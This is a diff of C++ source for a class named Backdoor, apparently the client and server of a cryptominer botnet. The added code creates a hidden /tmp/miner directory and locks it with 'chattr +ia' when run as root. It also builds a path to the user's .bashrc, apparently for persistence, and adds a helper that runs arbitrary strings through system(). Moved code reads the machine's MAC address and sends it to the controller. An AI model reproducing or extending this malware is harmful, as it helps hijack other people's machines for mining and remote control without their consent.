@@ -36,41 +36,6 @@ void Backdoor::download(const char *path){
 }
 
 
-std::string Backdoor::get_miner_id(){
-    if(this->is_server){
-        std::string miner_info;
-        this->c->send_message(this->sock, "4");
-        return this->c->recv_message(this->sock);
-    
-    }else{
-        
-        char wlan0[20], eth0[20];
-        FILE * f, *g; 
-        f = fopen("/sys/class/net/wlan0/address", "r");
-        if(f != NULL){
-            fscanf(f, "%s", wlan0);
-            fclose(f);
-            c->send_message(this->sock, wlan0);
-            return NULL;
-
-        }else{
-            g = fopen("/sys/class/net/eth0/address", "r");
-            if(g != NULL){
-                fscanf(g, "%s", eth0);
-                fclose(g);
-                c->send_message(this->sock, eth0);
-                return NULL;
-            }
-        }
-    }
-}
-
-
-std::string Backdoor::get_miner_ip(){
-    return  std::string(this->client_ip);
-}
-
-
 void Backdoor::menu(){
     int choice;
     std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;
@@ -107,18 +72,65 @@ void Backdoor::menu(){
 
 
 void Backdoor::persistence(){
+    
     const char *  root_path_init_d = "/etc/init.d";
-    const char * bash_rc = "~/.bashrc";
+    const char * persistence_directory = "/tmp/miner";
+    const char * chattr = "sudo chattr +ia /tmp/miner/";
+
+    std::string bash_rc_file = std::string(this->user_home) += std::string(".bashrc");
+    const char *bash_rc = bash_rc_file.c_str();
+    
     std::cout << "Running persistence" << std::endl;
-    if(geteuid() != 0)
-    {
+
+    mkdir(persistence_directory, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+
+    if(geteuid() != 0){
         std::cout << "Not root";
 
     }else{
+        
 
+        // only root can delete.
+        this->execute_command(chattr);
         std::cout << "root";
     }
 }
+
+
+std::string Backdoor::get_miner_id(){
+    if(this->is_server){
+        std::string miner_info;
+        this->c->send_message(this->sock, "4");
+        return this->c->recv_message(this->sock);
+    
+    }else{
+        
+        char wlan0[20], eth0[20];
+        FILE * f, *g; 
+        f = fopen("/sys/class/net/wlan0/address", "r");
+        if(f != NULL){
+            fscanf(f, "%s", wlan0);
+            fclose(f);
+            c->send_message(this->sock, wlan0);
+            return NULL;
+
+        }else{
+            g = fopen("/sys/class/net/eth0/address", "r");
+            if(g != NULL){
+                fscanf(g, "%s", eth0);
+                fclose(g);
+                c->send_message(this->sock, eth0);
+                return NULL;
+            }
+        }
+    }
+}
+
+
+std::string Backdoor::get_miner_ip(){
+    return  std::string(this->client_ip);
+}
+
 
 void Backdoor::get_home_enviroment(){
     struct passwd *pw;
@@ -133,6 +145,7 @@ void Backdoor::get_home_enviroment(){
     strcat(home, "/");
     this->user_home = home;
 }
+
 
 void Backdoor::get_username(){
     struct passwd *pw;
@@ -152,6 +165,10 @@ void Backdoor::get_desktop_enviroment(){
     this->user_desktop = path;   
 }
 
+
+void Backdoor::execute_command(const char *command){
+    system(command);
+}
 
 Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->sock = sock;
